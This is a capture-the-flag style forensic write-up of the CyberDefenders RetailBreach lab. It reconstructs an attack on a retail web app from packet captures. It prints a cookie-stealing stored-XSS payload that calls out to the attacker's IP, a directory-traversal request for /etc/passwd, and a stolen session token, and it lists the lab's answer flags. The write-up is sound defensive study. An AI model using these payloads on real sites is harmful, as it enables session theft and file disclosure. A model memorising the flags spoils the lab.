# RetailBreach Lab Write Up
**Platform:** CyberDefenders

---

## Scenario
In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

---

## Objective
Investigate network traffic with Wireshark to identify attacker TTPs, extract XSS payloads and session tokens, and determine exploited web application vulnerabilities.<br><br>
**Category:** Network Forensics <br>
**Difficulty:** Easy <br>

---

## Investigation Scope

This investigation focuses on reconstructing suspicious activity targeting
a web application using the network traffic provided in the CyberDefenders
RetailBreach lab.

The investigation covers:

- Identifying the attack source, targeted application, and relevant hosts.
- Reconstructing reconnaissance activity and the sequence of suspicious
  HTTP requests and responses.
- Examining cross-site scripting (XSS) payloads, injection points, and
  associated responses.
- Extracting relevant session tokens and investigating evidence of their
  exposure, theft, or unauthorized reuse.
- Identifying web application vulnerabilities supported by the observed
  requests and application behavior.
- Reviewing follow-on activity for evidence of unauthorized access,
  discovery, or lateral movement.
- Extracting indicators of compromise and building an evidence-supported
  timeline,.

---

## Environment

### Analysis Setup

- **Host operating system:** Fedora Linux 44
- **Analysis operating system:** Ubuntu
- **Analysis environment:** CyberDefenders-provided lab environment

### Analysis Tools & Tactics
- **Tools:** Wireshark, Network Miner, Brim
- **Tactics:** Reconnaissance, Initial Access, Execution, Credential Access, Discovery, Lateral Movement

### Artifacts
The analysis uses one provided artifact:

- `RetailBreach.pcap` - network traffic associated with the incident.

---

**Q1. Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Navigated to **Statistics -> Conversations** and selected the **IPv4** tab.
3. Identified the dominant conversation between `111.224.180.128` and `73.124.17.52`, containing **14,517 packets**.
4. Recorded `111.224.180.128` as the primary candidate for further investigation.

**Filter:**

Use this filter to inspect the candidate's traffic:

```wireshark
ip.addr == 111.224.180.128
```

**Evidence:**

- The IPv4 Conversations view shows **14,517 packets** exchanged between `111.224.180.128` and `73.124.17.52`.
- Of these, **7,066 packets** were sent from `111.224.180.128` to `73.124.17.52`, and **7,451 packets** traveled in the reverse direction.
- The conversation contains approximately **4 MB** of traffic.
- This traffic volume identifies a relevant candidate for investigation. Inspection of the associated HTTP requests is required to confirm malicious behavior; conversation statistics alone do not establish the attacker’s role.

**Supporting Screenshots:**
<img width="1220" height="351" alt="image" src="https://github.com/user-attachments/assets/1461aa21-1e3a-4f24-a03d-666206cefe8d" />

**Flag:** `111.224.180.128`

**Q2. The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Applied the filter below to inspect traffic originating from `111.224.180.128`.
3. Reviewed the repeated HTTP GET requests targeting different paths on the web server.
4. Opened **Follow -> TCP Stream** and examined **TCP stream 82**.
5. Inspected the **User-Agent** header and identified `gobuster/3.6`.

**Filter:**

```wireshark
ip.src == 111.224.180.128
```

**Evidence:**

- TCP stream **82** contains the following request:

  ```http
  GET /tapes HTTP/1.1
  Host: shopsphere.com
  User-Agent: gobuster/3.6
  Accept-Encoding: gzip
  ```

- Additional requests target paths such as `/z` and `/zencart`, using the same `gobuster/3.6` User-Agent.
- The repeated requests to different paths, together with the explicit User-Agent, support identifying **Gobuster version 3.6** as the directory brute-forcing tool.
- The displayed requests receive **HTTP/1.1 404 Not Found** responses, indicating that those particular paths were not found.

**Supporting Screenshots:**
<img width="1663" height="725" alt="image" src="https://github.com/user-attachments/assets/82e7eb62-e72a-4095-9537-33dd6da0d149" />
<img width="1135" height="826" alt="Q2-2" src="https://github.com/user-attachments/assets/feceaef4-c067-4dc4-af55-3852e4237efd" />

**Flag:** `gobuster`

**Q3. Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Applied the filter below to inspect HTTP POST requests from `111.224.180.128`.
3. Selected **packet 10058**, containing a POST request to `/reviews.php`.
4. Opened **Follow -> TCP Stream** and examined the request body.
5. Decoded the URL-encoded `review` parameter to recover the JavaScript payload.
6. Examined the server response and located the same script in the returned HTML.

**Filter:**

```wireshark
ip.src == 111.224.180.128 && http.request.method == "POST"
```

**Evidence:**

- Packet **10058**, at relative timestamp **1115.139671**, contains the following request:

  ```http
  POST /reviews.php HTTP/1.1
  Host: shopsphere.com
  Content-Type: application/x-www-form-urlencoded
  ```

- The request body submits the payload through the `review` parameter:

  ```text
  review=%3Cscript%3Efetch%28%27http%3A%2F%2F111.224.180.128%2F%27+%2B+document.cookie%29%3B%3C%2Fscript%3E
  ```

- Decoding the parameter reveals:

  ```html
  <script>fetch('http://111.224.180.128/' + document.cookie);</script>
  ```

- The script is designed to send JavaScript-accessible cookie values to the attacker's IP address using `fetch()`.
- The server returns **HTTP/1.1 200 OK**, and the response HTML includes the script unescaped beneath the reviews.
- This demonstrates payload submission and inclusion in the page. Browser execution and successful cookie transfer require corroborating traffic.

**Supporting Screenshots:**
<img width="1663" height="231" alt="Q3-1" src="https://github.com/user-attachments/assets/567de878-f60c-4614-a753-7e6af7942217" />
<img width="1135" height="779" alt="Q3-2" src="https://github.com/user-attachments/assets/9a26a685-7c6b-4a81-97af-9a0f79574abe" />

**Flag:** `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

**Q4. Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Used **packet 10058**, identified in Q3, as the reference point for the XSS payload submission.
3. Applied the filter below to inspect traffic from the admin client referencing `reviews.php`.
4. Located **packet 10106**, containing the first displayed GET request to `/reviews.php` after the injection.
5. Expanded the **Frame** section in the packet details pane.
6. Read the **UTC Arrival Time** and recorded it in `YYYY-MM-DD HH:MM` format.

**Filter:**

```wireshark
ip.src == 135.143.142.5 && http contains "reviews.php"
```

**Evidence:**

- The attacker submitted the XSS payload in **packet 10058**, at capture-relative timestamp **1115.139671**.
- The admin client subsequently requested the affected page in **packet 10106**, at relative timestamp **1178.992083**:

  ```http
  GET /reviews.php HTTP/1.1
  ```

- This request originates from `135.143.142.5` and targets `73.124.17.52`.
- The Frame details for packet **10106** show:

  ```text
  UTC Arrival Time: Mar 29, 2024 12:09:50.869688000 UTC
  ```

- An earlier visit to `/reviews.php`, shown in packet **61**, occurred before the payload submission. Packet **10106** is the first demonstrated visit after the injection.
- Expressed in `YYYY-MM-DD HH:MM` format, the timestamp is **2024-03-29 12:09 UTC**.

**Supporting Screenshots:**
<img width="1663" height="231" alt="Q4-1" src="https://github.com/user-attachments/assets/7218645e-66b7-4e2d-ae5e-3c70453fe5e8" />
<img width="1607" height="266" alt="Q4-2" src="https://github.com/user-attachments/assets/61f60e21-ab57-4935-a22e-d16e8493f459" />
<img width="845" height="335" alt="Q4-3" src="https://github.com/user-attachments/assets/ac6e7ba8-3623-4c8c-a7ed-8a50ac18812f" />

**Flag:** `2024-03-29 12:09`

**Q5. The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Applied the filter below to inspect requests from the admin client referencing `reviews.php`.
3. Selected **packet 10106**, containing the admin's request to the page after the XSS injection.
4. Opened **Follow -> TCP Stream** and inspected the HTTP request headers.
5. Located the **Cookie** header and extracted the `PHPSESSID` value.
6. Reviewed the response HTML for the injected script and administrator interface context.

**Filter:**

```wireshark
ip.src == 135.143.142.5 && http contains "reviews.php"
```

**Evidence:**

- The admin client requests the affected page:

  ```http
  GET /reviews.php HTTP/1.1
  Host: shopsphere.com
  Cookie: PHPSESSID=lqkctf24s9h9lg67teu8uevn3q
  ```

- The session cookie is named **PHPSESSID**, with the value:

  ```text
  lqkctf24s9h9lg67teu8uevn3q
  ```

- The returned HTML contains an **Admin Panel** link to `admin.php`, a **Logout** link, and the injected script identified in Q3.
- The script is designed to forward JavaScript-accessible cookie values to `111.224.180.128`.

**Supporting Screenshots:**
<img width="1594" height="227" alt="image" src="https://github.com/user-attachments/assets/78e0a628-b8a5-4a6b-bf65-39f4dc4277ee" />
<img width="1136" height="788" alt="image" src="https://github.com/user-attachments/assets/d147dab6-13ed-480c-ab88-4d07cb6f42ed" />

**Flag:** `lqkctf24s9h9lg67teu8uevn3q`

**Q6. Identifying which scripts have been exploited is a key step in mitigating vulnerabilities within a web application. What is the name of the script that was exploited by the attacker?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Applied the filter below to inspect the attacker's HTTP traffic after the admin visited the injected page.
3. Identified requests targeting `/admin/log_viewer.php`.
4. Located **packet 10217**, which supplies directory-traversal sequences through the `file` parameter.
5. Opened **Follow -> TCP Stream** and examined the request and corresponding response.
6. Confirmed that the response exposes `/etc/passwd` contents, identifying `log_viewer.php` as the exploited script.

**Filter:**

```wireshark
ip.src == 111.224.180.128 && http && frame.number > 10106
```

**Evidence:**

- The attacker first requests the log-viewing endpoint and a named log file:

  ```text
  /admin/log_viewer.php
  /admin/log_viewer.php?file=error.log
  ```

- A subsequent request targets the same script with repeated `../` sequences in the `file` parameter to access `/etc/passwd`.
- The request carries the session token identified in Q5:

  ```http
  Cookie: PHPSESSID=lqkctf24s9h9lg67teu8uevn3q
  ```

- The server returns **HTTP/1.1 200 OK**, and the response body contains system account entries, including:

  ```text
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ```

- The returned file contents support successful local file disclosure through **log_viewer.php**.

**Supporting Screenshots:**
<img width="2170" height="428" alt="Q6-1" src="https://github.com/user-attachments/assets/b3bb57ea-80f6-477a-ba6f-a1dfdedcab95" />
<img width="1084" height="560" alt="Q6-2" src="https://github.com/user-attachments/assets/3e633900-0ba4-4407-a145-a80388019e22" />

**Flag:** `log_viewer.php`

**Q7. Exploiting vulnerabilities to access sensitive system files is a common tactic among attackers. Can you identify the payload that was used by the attacker to gain access to a sensitive system file?**

**Steps taken:**

1. Opened `RetailBreach.pcap` in Wireshark.
2. Applied the filter below to inspect the attacker's HTTP requests after the admin visited the injected page.
3. Located **packet 10217**, targeting `/admin/log_viewer.php`.
4. Examined the `file` query parameter and extracted the directory-traversal payload.
5. Confirmed that the payload contains five `../` segments followed by `etc/passwd`.
6. Correlated the request with the file contents returned in the response examined in Q6.

**Filter:**

```wireshark
ip.src == 111.224.180.128 && http && frame.number > 10106
```

**Evidence:**

- The attacker submits the following request:

  ```http
  GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1
  ```

- The `file` parameter contains:

  ```text
  ../../../../../etc/passwd
  ```

- The five `../` segments attempt to traverse parent directories and access the system account file `/etc/passwd`.
- The corresponding response returns **HTTP/1.1 200 OK** and system account entries, including:

  ```text
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ```

- The returned contents support successful file disclosure through the directory-traversal payload.

**Supporting Screenshots:**
<img width="2170" height="428" alt="Q7" src="https://github.com/user-attachments/assets/d7c7e79f-7146-4875-90b4-e6330d0d50e2" />

**Flag:** `../../../../../etc/passwd`

## Findings

The reviewed network evidence reconstructs a compromise of **ShopSphere** involving directory enumeration, stored cross-site scripting, session-cookie reuse, and path traversal. Requests from `111.224.180.128` probe the application and submit a cookie-stealing script through `/reviews.php`. The administrator subsequently requests that page from `135.143.142.5`. The same administrator session token later appears in an attacker request to `/admin/log_viewer.php`, whose response exposes `/etc/passwd` contents.

The evidence supports unauthorized reuse of the administrator's session and successful file disclosure. The intermediate cookie-exfiltration callback is not shown in the supplied screenshots.

### Key Findings

| Area | Finding | Evidence |
|---|---|---|
| Attack source | `111.224.180.128` communicates with `73.124.17.52` and originates the investigated scanning, XSS, and file-access requests. | Q1–Q3 and Q6–Q7: conversation statistics and HTTP request sources. |
| Directory enumeration | Repeated GET requests probe different paths. The request header reports `User-Agent: gobuster/3.6`, supporting identification of Gobuster. | Q2: TCP stream **82**. |
| Stored XSS | Packet **10058** submits a script through the `review` parameter. The script appears unescaped in the response and remains present in the later page returned to the administrator. | Q3 and Q5: POST body and subsequent GET response for `/reviews.php`. |
| Administrator exposure | The administrator client requests the injected page at **2024-03-29 12:09:50.869688 UTC**. | Q4: Frame details for packet **10106**. |
| Session reuse | The administrator request and the later attacker request carry the same `PHPSESSID` value. The latter receives the disclosed system-file contents. | Q5–Q6: matching Cookie headers and the file-read response. |
| Path traversal and file disclosure | `log_viewer.php` accepts `../../../../../etc/passwd` through its `file` parameter and returns recognizable system account entries. | Q6–Q7: packet **10217** and its corresponding response. |

### Activity Timeline

The table uses capture-relative seconds from the original Wireshark screenshots. Only the administrator visit has a directly inspected absolute packet timestamp in the documented analysis; other absolute packet times have not been inferred.

| Capture-relative time (seconds) | Packet(s) | Observed activity |
|---|---|---|
| `689.861250–689.864907` | **9881–9895**, selected requests | Requests from `111.224.180.128` probe multiple web paths. Stream **82**, examined separately, identifies the `gobuster/3.6` User-Agent. |
| `1115.139671` | **10058** | The attacker submits the cookie-stealing XSS payload to `/reviews.php`. |
| `1178.992083` | **10106** | The administrator requests `/reviews.php` using the session token identified in Q5. The response includes the injected script. |
| `1268.432502` | **10170** | The attacker requests `/admin/dashboard.php`. This row establishes the request; its response was not supplied in the packet-list screenshot. |
| `1293.311063` | **10196** | The attacker requests `/admin/log_viewer.php`. |
| `1299.925106` | **10205** | The attacker supplies `file=error.log` to the log viewer. |
| `1320.734978` | **10217** | The attacker submits the traversal payload targeting `/etc/passwd`; the corresponding response contains system account records. |

## Indicators

### Attack Indicators and Artifacts

| Type | Value | Context |
|---|---|---|
| Attack source IP | `111.224.180.128` | Source of the investigated directory probes, XSS submission, and traversal request. |
| Payload-designated receiver | `http://111.224.180.128/` | Destination specified by the injected `fetch()` call; a callback packet was not supplied. |
| Tool indicator | `gobuster/3.6` | User-Agent associated with the directory enumeration. |
| XSS injection endpoint | `/reviews.php` | The `review` form parameter accepts the malicious script. |
| Affected file-viewing endpoint | `/admin/log_viewer.php` | The `file` parameter is used to retrieve the system file. |
| Traversal payload | `../../../../../etc/passwd` | Five `../` segments followed by the targeted filename. |
| Disclosed system file | `/etc/passwd` | Response contains records for accounts including `root` and `daemon`. |
| Compromised session value | `lqkctf24s9h9lg67teu8uevn3q` | `PHPSESSID` observed in both administrator and subsequent attacker requests. |

**Recovered XSS payload:**

```html
<script>fetch('http://111.224.180.128/' + document.cookie);</script>
```

**Observed traversal request:**

```http
GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1
Host: shopsphere.com
Cookie: PHPSESSID=lqkctf24s9h9lg67teu8uevn3q
```

## Lessons Learned

- **Use behavior to validate a suspected source.** Conversation volume helped prioritize `111.224.180.128`; the scanning pattern, injected script, and traversal request established its role in the attack.
- **Follow both directions of the conversation.** Request parameters reveal the attempted action, while the returned HTML and account records establish what the application exposed. 
- **Correlate tokens across clients.** Matching the administrator's `PHPSESSID` to a later attacker request provides stronger evidence of session reuse than viewing the administrator's Cookie header alone.
- **Protect user-generated content at rendering time.** Render review text using context-appropriate output encoding; sanitize permitted HTML with a maintained sanitizer. 
- **Protect and revoke sessions.** Use `HttpOnly` for session cookies, HTTPS with `Secure`, and an appropriate `SameSite` policy. Revoke compromised sessions server-side. 
- **Restrict file selection on the server.** Prefer allowlisted log identifiers mapped to fixed paths. Normalize paths and enforce a permitted directory before reading files.
- **Preserve evidence and timestamp provenance.** Keep the capture and original screenshots unchanged, annotate working copies, and verify that edits preserve packet data. Record whether each time comes from packet arrival, capture-relative display, or an HTTP response header.

Further investigation should locate the cookie-exfiltration callback, review all requests carrying the compromised session, and correlate application access logs, session records, and stored review content. Search for additional traversal requests to determine whether other files were exposed.

Response priorities include preserving the affected review and relevant logs, invalidating the compromised session, removing the malicious review after evidence preservation, correcting the review-rendering and file-access flaws, and checking for additional affected sessions or disclosed files.

## References
`-`
